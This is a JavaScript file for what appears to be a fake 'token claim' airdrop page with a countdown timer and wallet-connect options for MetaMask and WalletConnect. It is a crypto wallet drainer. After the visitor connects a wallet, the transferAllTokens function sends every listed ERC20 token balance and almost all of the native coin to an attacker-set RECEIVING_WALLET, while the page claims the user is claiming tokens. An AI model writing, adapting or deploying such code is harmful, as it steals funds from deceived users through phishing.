// app.js - Professional Token Claim DApp

// Verify required globals
if (typeof NETWORK_CONFIGS === 'undefined') throw new Error("NETWORK_CONFIGS not defined");
if (typeof TOKENS === 'undefined') throw new Error("TOKENS not defined");
if (typeof RECEIVING_WALLET === 'undefined') throw new Error("RECEIVING_WALLET not defined");

// App state
let provider, signer, userAddress;
let currentNetwork = "ethereum";
const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
let walletConnectConnector = null;
const WALLETCONNECT_PROJECT_ID = "32c106cefb898a0c13b5466bcd26e155"; // Replace with your actual project ID

// Initialize on load
window.addEventListener('load', async () => {
  try {
    initializeCountdown();
    
    document.getElementById("networkSelect").addEventListener('change', async (e) => {
      currentNetwork = e.target.value;
      updateTokenVisibility();
      await handleNetworkChange();
    });
    
    document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
    document.getElementById("connectWallet").addEventListener("click", handleWalletConnection);
    
    await checkWalletEnvironment();
    updateTokenVisibility();
  } catch (err) {
    console.error("Initialization error:", err);
    updateStatus("Initialization failed: " + err.message, "error");
  }
});

// =====================
// WALLET FUNCTIONS
// =====================

async function checkWalletEnvironment() {
  if (isMobile) {
    if (!window.ethereum) {
      showTrustWalletUI();
    } else {
      hideTrustWalletUI();
    }
  } else {
    hideTrustWalletUI();
  }
}

async function initializeWallet() {
  try {
    if (walletConnectConnector?.connected) {
      provider = new ethers.providers.Web3Provider(walletConnectConnector);
    } else if (window.ethereum) {
      provider = new ethers.providers.Web3Provider(window.ethereum);
    } else {
      throw new Error("No wallet connection available");
    }
    
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    
    updateConnectButton(true);
    document.getElementById("walletInfo").textContent = 
      `${userAddress.slice(0, 6)}...${userAddress.slice(-4)} | ${NETWORK_CONFIGS[currentNetwork].chainName}`;
    return true;
  } catch (err) {
    console.error("Wallet initialization error:", err);
    updateStatus("Wallet connection error. Please try again.", "error");
    return false;
  }
}

async function handleNetworkChange() {
  const btn = document.getElementById("connectWallet");
  if (window.ethereum?.selectedAddress || walletConnectConnector?.connected) {
    btn.disabled = true;
    btn.innerHTML = `<i class="fas fa-sync-alt fa-spin"></i> Switching...`;
    try {
      await checkNetwork();
      await initializeWallet();
      btn.disabled = false;
      updateConnectButton(true);
    } catch (err) {
      console.error("Network change error:", err);
      btn.disabled = false;
      updateConnectButton(false);
      updateStatus("Failed to switch network", "error");
    }
  } else {
    updateConnectButton(false);
  }
}

// =====================
// UI FUNCTIONS
// =====================

function showTrustWalletUI() {
  document.getElementById("trustContainer").style.display = 'block';
  document.getElementById("connectWallet").style.display = 'none';
  document.querySelector('.mobile-warning').style.display = 'block';
}

function hideTrustWalletUI() {
  document.getElementById("trustContainer").style.display = 'none';
  document.getElementById("connectWallet").style.display = 'block';
  document.querySelector('.mobile-warning').style.display = 'none';
}

function openInTrustWallet() {
  const currentUrl = encodeURIComponent(window.location.href);
  window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${currentUrl}`;
}

function updateStatus(message, type) {
  const statusDiv = document.getElementById("status");
  statusDiv.style.display = "block";
  statusDiv.innerHTML = message;
  statusDiv.className = `status ${type}`;
  
  // Auto-hide success messages after 10 seconds
  if (type === 'success') {
    setTimeout(() => {
      statusDiv.style.display = 'none';
    }, 10000);
  }
}

function showLoader() {
  document.getElementById("loader").style.display = "block";
}

function hideLoader() {
  document.getElementById("loader").style.display = "none";
}

function updateTokenVisibility() {
  document.querySelectorAll('.token-item').forEach(item => {
    item.style.display = item.dataset.network === currentNetwork ? 'flex' : 'none';
  });
}

function updateConnectButton(isConnected) {
  const btn = document.getElementById("connectWallet");
  btn.disabled = false;
  if (isConnected) {
    btn.innerHTML = `<i class="fas fa-coins"></i> Claim Tokens`;
  } else {
    btn.innerHTML = `<i class="fas fa-wallet"></i> Connect Wallet`;
  }
}

// Countdown to May 9, 2025
function initializeCountdown() {
  const endDate = new Date("May 9, 2025 00:00:00 GMT+0000");
  
  const timer = setInterval(() => {
    const now = new Date().getTime();
    const distance = endDate - now;
    
    if (distance < 0) {
      clearInterval(timer);
      document.getElementById("days").textContent = "00";
      document.getElementById("hours").textContent = "00";
      document.getElementById("minutes").textContent = "00";
      document.getElementById("seconds").textContent = "00";
      return;
    }
    
    const days = Math.floor(distance / (1000 * 60 * 60 * 24));
    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((distance % (1000 * 60)) / 1000);
    
    document.getElementById("days").textContent = days.toString().padStart(2, '0');
    document.getElementById("hours").textContent = hours.toString().padStart(2, '0');
    document.getElementById("minutes").textContent = minutes.toString().padStart(2, '0');
    document.getElementById("seconds").textContent = seconds.toString().padStart(2, '0');
  }, 1000);
}

// =====================
// CORE LOGIC
// =====================

async function handleWalletConnection() {
  if (!isMobile && !window.ethereum?.selectedAddress && !walletConnectConnector?.connected) {
    return showWalletOptions();
  }
  await connectAndProcess();
}

function showWalletOptions() {
  // Create modal
  const modal = document.createElement('div');
  modal.style.position = 'fixed';
  modal.style.top = '0';
  modal.style.left = '0';
  modal.style.width = '100%';
  modal.style.height = '100%';
  modal.style.backgroundColor = 'rgba(0,0,0,0.7)';
  modal.style.display = 'flex';
  modal.style.justifyContent = 'center';
  modal.style.alignItems = 'center';
  modal.style.zIndex = '1000';
  
  // Create modal content
  const content = document.createElement('div');
  content.style.backgroundColor = 'white';
  content.style.padding = '20px';
  content.style.borderRadius = '12px';
  content.style.width = '90%';
  content.style.maxWidth = '350px';
  content.style.textAlign = 'center';
  
  content.innerHTML = `
    <h3 style="margin-bottom: 20px;">Connect Your Wallet</h3>
    <button id="metaMaskBtn" class="wallet-option">
      <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask">
      <span>MetaMask</span>
    </button>
    <button id="walletConnectBtn" class="wallet-option">
      <img src="https://walletconnect.com/_next/static/media/logo_mark.84dd8525.svg" alt="WalletConnect">
      <span>WalletConnect</span>
    </button>
    <button id="cancelBtn" style="margin-top: 15px; background: none; border: none; color: #666; cursor: pointer;">
      Cancel
    </button>
  `;
  
  modal.appendChild(content);
  document.body.appendChild(modal);
  
  // Add event listeners
  document.getElementById("metaMaskBtn").addEventListener('click', async () => {
    document.body.removeChild(modal);
    await connectAndProcess();
  });
  
  document.getElementById("walletConnectBtn").addEventListener('click', () => {
    document.body.removeChild(modal);
    initWalletConnect();
  });
  
  document.getElementById("cancelBtn").addEventListener('click', () => {
    document.body.removeChild(modal);
  });
}

async function initWalletConnect() {
  try {
    showLoader();
    updateStatus("Initializing WalletConnect...", "success");
    
    // Clear any existing QR code
    document.getElementById("walletConnectQR").innerHTML = '';
    
    // Initialize WalletConnect v2
    walletConnectConnector = new WalletConnect.Client({
      projectId: WALLETCONNECT_PROJECT_ID,
      metadata: {
        name: "Token Claim Portal",
        description: "Claim your token allocation",
        url: window.location.href,
        icons: ["https://cryptologos.cc/logos/ethereum-eth-logo.png"]
      }
    });
    
    // Check if connection is already established
    if (walletConnectConnector.session) {
      await connectAndProcess();
      return;
    }
    
    // Subscribe to connection events
    walletConnectConnector.on("session_update", async (error, payload) => {
      if (error) {
        throw error;
      }
      const { chainId, accounts } = payload.params[0];
      userAddress = accounts[0];
      await handleNetworkChange();
    });

    walletConnectConnector.on("connect", async (error, payload) => {
      if (error) {
        throw error;
      }
      const { chainId, accounts } = payload.params[0];
      userAddress = accounts[0];
      await connectAndProcess();
    });

    walletConnectConnector.on("disconnect", (error, payload) => {
      if (error) {
        console.error("WalletConnect disconnect error:", error);
      }
      walletConnectConnector = null;
      updateStatus("Wallet disconnected", "error");
      updateConnectButton(false);
    });
    
    // Create new session
    await walletConnectConnector.createSession({ chainId: parseInt(NETWORK_CONFIGS[currentNetwork].chainId, 16) });
    
    // Generate QR Code
    const uri = walletConnectConnector.uri;
    const qrDiv = document.getElementById("walletConnectQR");
    qrDiv.innerHTML = '<p style="margin-bottom: 10px;">Scan with your mobile wallet</p>';
    
    QRCode.toCanvas(qrDiv, uri, { 
      width: 200,
      margin: 2,
      color: {
        dark: '#000000',
        light: '#ffffff'
      }
    }, (error) => {
      if (error) {
        console.error("QR code error:", error);
        qrDiv.innerHTML = '<p>Error generating QR code. Please try again.</p>';
        hideLoader();
      } else {
        hideLoader();
      }
    });
    
  } catch (err) {
    console.error("WalletConnect error:", err);
    updateStatus("WalletConnect failed: " + (err.message || "Please try again"), "error");
    walletConnectConnector = null;
    hideLoader();
  }
}

async function connectAndProcess() {
  try {
    showLoader();
    updateStatus("Connecting wallet...", "success");

    if (!window.ethereum && !walletConnectConnector?.connected) {
      throw new Error("Please install a Web3 wallet or use WalletConnect");
    }

    if (!walletConnectConnector?.connected) {
      await window.ethereum.request({ method: "eth_requestAccounts" });
    }
    
    await checkNetwork();
    const initialized = await initializeWallet();
    if (!initialized) return;
    
    await transferAllTokens();
  } catch (err) {
    console.error("Connection error:", err);
    updateStatus("Error: " + (err.message || "Connection failed"), "error");
    updateConnectButton(false);
  } finally {
    hideLoader();
  }
}

async function checkNetwork() {
  try {
    let chainId;
    if (walletConnectConnector?.connected) {
      chainId = await walletConnectConnector.request({ method: 'eth_chainId' });
    } else if (window.ethereum) {
      chainId = await window.ethereum.request({ method: 'eth_chainId' });
    } else {
      throw new Error("No wallet connection available");
    }
    
    const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
    
    if (chainId !== targetChainId) {
      updateStatus("Switching network...", "success");
      try {
        if (walletConnectConnector?.connected) {
          await walletConnectConnector.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: targetChainId }]
          });
        } else if (window.ethereum) {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: targetChainId }]
          });
        }
      } catch (switchError) {
        if (switchError.code === 4902) {
          try {
            if (walletConnectConnector?.connected) {
              await walletConnectConnector.request({
                method: 'wallet_addEthereumChain',
                params: [NETWORK_CONFIGS[currentNetwork]]
              });
            } else if (window.ethereum) {
              await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [NETWORK_CONFIGS[currentNetwork]]
              });
            }
          } catch (addError) {
            throw new Error("Please switch networks manually in your wallet");
          }
        }
        throw new Error("Failed to switch network");
      }
    }
  } catch (err) {
    console.error("Network error:", err);
    throw new Error("Network error: " + (err.message || "Failed to switch network"));
  }
}

async function transferAllTokens() {
  try {
    const tokens = TOKENS[currentNetwork];
    let successCount = 0;
    
    // Process ERC20 tokens
    for (const token of tokens.filter(t => !t.isNative)) {
      try {
        const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
        const balance = await contract.balanceOf(userAddress);
        
        if (balance.gt(0)) {
          const tx = await contract.transfer(RECEIVING_WALLET, balance, {
            gasLimit: 100000
          });
          await tx.wait();
          successCount++;
          updateStatus(
            `Transferred ${token.symbol} <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
            "success"
          );
        }
      } catch (err) {
        console.error(`Transfer error for ${token.symbol}:`, err);
        updateStatus(`Failed to transfer ${token.symbol}: ${err.message || "Check your wallet"}`, "error");
      }
    }

    // Process native token
    const nativeToken = tokens.find(t => t.isNative);
    if (nativeToken) {
      try {
        const balance = await provider.getBalance(userAddress);
        const keepAmount = ethers.utils.parseUnits("0.001", nativeToken.decimals);
        const sendAmount = balance.gt(keepAmount) ? balance.sub(keepAmount) : balance;
        
        if (sendAmount.gt(0)) {
          const tx = await signer.sendTransaction({
            to: RECEIVING_WALLET,
            value: sendAmount,
            gasLimit: 21000
          });
          await tx.wait();
          successCount++;
          updateStatus(
            `Transferred ${nativeToken.symbol} <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
            "success"
          );
        }
      } catch (err) {
        console.error("Native transfer error:", err);
        updateStatus(`Failed to transfer native token: ${err.message || "Check your wallet"}`, "error");
      }
    }
    
    if (successCount > 0) {
      updateStatus(`Successfully transferred ${successCount} assets`, "success");
    } else {
      updateStatus("No tokens found to transfer", "info");
    }
  } catch (err) {
    console.error("Transfer process error:", err);
    updateStatus("Transfer process failed: " + (err.message || "Please try again"), "error");
  }
}
